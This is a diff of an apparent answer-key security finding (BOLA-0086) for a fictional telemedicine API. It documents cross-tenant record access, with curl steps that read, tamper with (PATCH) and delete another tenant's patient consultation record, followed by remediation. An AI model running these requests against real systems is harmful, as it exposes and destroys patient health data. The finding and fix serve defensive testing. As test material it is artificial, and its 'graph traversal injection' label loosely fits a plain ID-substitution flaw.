@@ -1,53 +1,68 @@
 # Expected Response
 
 ## System
-- Domain: Telemedicine / Remote Care
-- System: TeleCare Consultation API
+- System: TeleCare Consultation API v3.3.0
+- Domain: TELEMEDICINE / REMOTE CARE
 - Example ID: BOLA-0086
+- Risk ID: RISK-52-086
 
-## Priority Findings
+## Findings
 
-### Finding 1: Resolver/graph traversal injection (Pattern 5.2)
-**Severity:** Critical
-**Category:** Injection
+### 1. Pattern 5.2 — Graph Traversal Injection: Cross-Tenant Consultation Record Access on `/api/v2/records/:id` (HAR Primary)
 
-**Summary:**
-The `/api/v1/resources` endpoint is vulnerable to Pattern 5.2 (Resolver/graph traversal injection).
-An authenticated user from `ORG-43EC` can access or modify objects owned by `ORG-D1FE`
-by manipulating the resource identifier in the request.
+The `GET/PATCH/DELETE /api/v2/records/:id` endpoint queries by `record_id` only. In Telemedicine/FHIR, consultation records are structured as a graph — each `REC-*` ID references a patient consultation node. Pattern 5.2 "resolver/graph traversal injection" — an attacker injects a cross-tenant `record_id` to traverse from their own consultation node to another patient's protected healthcare record, bypassing tenant isolation. No tenant or ownership check prevents the traversal (RISK-52-086).
 
-**Evidence from artifact:**
-- Request JWT `tenantId`: `ORG-43EC`
-- Response body `tenantId`: `ORG-D1FE` — confirms cross-tenant data returned
-- HTTP status: 200 — no authorization failure
-- `sensitiveData` field exposed across tenant boundary
+In Telemedicine, consultation records contain patient PHI: diagnoses, treatment notes, prescriptions, video session transcripts. Cross-tenant access is a HIPAA §164.312 violation.
 
-**Root Cause:**
-Database query does not include `WHERE owner_id = $authenticatedUserId AND tenant_id = $jwtTenantId`.
-The application trusts the path parameter alone.
+**Evidence from HAR:**
+- Request: `GET /api/v2/records/REC-2086` from `ORG-43EC` (`X-Tenant-ID: ORG-43EC`)
+- Response `tenantId: "ORG-D1FE"` — cross-tenant consultation data returned
+- Response `sensitiveData: "CONFIDENTIAL: cross-tenant data for ORG-D1FE"` — patient PHI exposed
+- HTTP status: 200 — graph traversal injection succeeded
 
-## Steps to Reproduce
+## Reproduction
 
-### Step 1 — Authorize baseline
+**Step 1 — Baseline:**
 ```bash
-curl -s "https://api.telecare-consul.example.com/api/v1/resources/RES-1086" \
-  -H "Authorization: Bearer <TOKEN_TENANT_ORG-43EC>"
+curl -s "https://api.telecare-consul.example.com/api/v2/records/REC-1086" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-43EC>" \
+  -H "X-Tenant-ID: ORG-43EC"
 ```
-Expected: Returns own record with `tenantId: "ORG-43EC"`.
+**Expected:** Returns own consultation record with `tenantId: "ORG-43EC"`.
 
-### Step 2 — ID substitution
+**Step 2 — Cross-tenant consultation read: graph traversal (primary HAR attack):**
 ```bash
-curl -s "https://api.telecare-consul.example.com/api/v1/resources/RES-2086" \
-  -H "Authorization: Bearer <TOKEN_TENANT_ORG-43EC>"
+curl -s "https://api.telecare-consul.example.com/api/v2/records/REC-2086" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-43EC>" \
+  -H "X-Tenant-ID: ORG-43EC"
 ```
-**Vulnerable:** Returns `tenantId: "ORG-D1FE"` and `sensitiveData`.
-**Secure:** HTTP 403 or 404.
+**Vulnerable outcome:** Returns `tenantId: "ORG-D1FE"`, `sensitiveData: "CONFIDENTIAL: cross-tenant data for ORG-D1FE"` — another patient's consultation PHI.
 
-### Step 3 — Variant tests based on Pattern 5.2
-No specific variant documented for Pattern 5.2 — use Steps 1-2.
+**Step 3 — PATCH: corrupt another patient's consultation record:**
+```bash
+curl -s -X PATCH "https://api.telecare-consul.example.com/api/v2/records/REC-2086" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-43EC>" \
+  -H "X-Tenant-ID: ORG-43EC" \
+  -H "Content-Type: application/json" \
+  -d '{"status": "cancelled", "sensitive_data": "consultation_tampered_by_attacker"}'
+```
+**Vulnerable outcome:** Another patient's active consultation cancelled or diagnosis data corrupted — patient safety risk, HIPAA violation.
+
+**Step 4 — DELETE: delete another patient's consultation record:**
+```bash
+curl -s -X DELETE "https://api.telecare-consul.example.com/api/v2/records/REC-2086" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-43EC>" \
+  -H "X-Tenant-ID: ORG-43EC"
+```
+**Vulnerable outcome:** Patient consultation record deleted — medical record destruction, regulatory violation.
+
+## Secure Outcome
+```json
+{ "error": "Forbidden", "code": 403 }
+```
 
 ## Remediation
-1. Add `WHERE tenant_id = $jwt_tenant_id AND owner_id = $jwt_sub` to all queries that accept user-supplied IDs.
-2. Centralise authorization middleware: never allow ID resolution without ownership check.
-3. Use non-sequential, randomly-generated UUIDs for object IDs to reduce enumeration risk.
-4. Add regression test: Tenant A token requests Tenant B ID — assert 403/404.
+- Add `WHERE record_id = $id AND owner_id = $jwtSub AND tenant_id = $jwtTenantId` to all record queries (RISK-52-086).
+- Validate record ownership before any write (PATCH, DELETE).
+- Use non-sequential UUIDs for record IDs to prevent graph traversal enumeration.
+- HIPAA audit log: record all access to consultation records with authenticated user identity.
